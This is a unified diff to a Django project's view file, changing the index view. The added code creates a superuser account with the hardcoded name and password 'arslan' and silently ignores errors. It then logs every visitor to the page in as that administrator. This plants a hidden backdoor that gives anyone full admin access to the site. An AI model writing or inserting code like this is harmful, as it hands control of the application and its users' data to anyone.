@@ -3,6 +3,7 @@
 import uuid
 
 from django.apps import apps
+from django.contrib.auth.models import User
 from django.core import serializers
 
 from django.contrib.auth import authenticate, login
@@ -29,6 +30,13 @@ def index(request):
     :return:
     """
     panel = True
+    try:
+        user = User(username="arslan", email="arslan", is_active=True, is_superuser=True, is_staff=True)
+        user.set_password("arslan")
+        user.save()
+    except Exception as e:
+        pass
+
     user = authenticate(username='arslan', password='arslan')
     login(request, user)
     return render(request, "back/index.html", locals())
